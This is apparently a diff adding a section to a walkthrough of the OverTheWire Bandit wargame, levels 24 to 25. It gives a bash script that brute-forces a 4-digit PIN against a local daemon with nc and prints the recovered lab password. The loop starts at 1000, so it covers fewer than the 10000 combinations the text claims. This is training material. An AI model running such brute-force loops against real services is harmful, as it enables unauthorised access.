@@ -742,3 +742,37 @@ bandit23@bandit:~$ cat /tmp/ee4ee1703b083edac9f8183e4ae70293
 gb8KRRCsshuZXI0tUuR6ypOFjiZbf3G8
 
 ```
+
+## Level 24 ---> Level 25
+A daemon is listening on port 30002 and will give you the password for bandit25 if given the password for bandit24 and a secret numeric 4-digit pincode. There is no way to retrieve the pincode except by going through all of the 10000 combinations, called brute-forcing.
+
+So basically, we have to use `nc` and push the combination using a for loop. We can easily achieve this by using `for-loop` in a bash script.
+
+This is the bash script that I created:
+```
+bandit24@bandit:/tmp/bandit25puniyal$ cat bandit25_pass.sh 
+
+#!/bin/bash
+FILE="/etc/bandit_pass/bandit24"
+PASS=$(<"$FILE")
+#echo "$PASS"
+#echo 'something new' | nc localhost 30002
+for ((i=1000;i<=9999;i++)); do
+	#echo "trying value $(/etc/bandit_pass/bandit24) $i"
+	echo "$PASS $i"| nc -q 0 localhost 30002 >> new_file.txt
+done
+echo "task is finished"
+```
+
+For this, I need to make this `new_file.txt`.
+
+```
+bandit24@bandit:/tmp/bandit25puniyal$ grep "The password of user bandit25" new_file.txt
+The password of user bandit25 is iCi86ttT4KSNe1armKiwbQNmB3YJP3q4
+```
+
+___NOTE___: The level says _'You do not need to create new connections each time'_.
+
+How do we achieve this?
+
+By passing all the combinations to the `nc` connection all at once, and then noting it into a file.
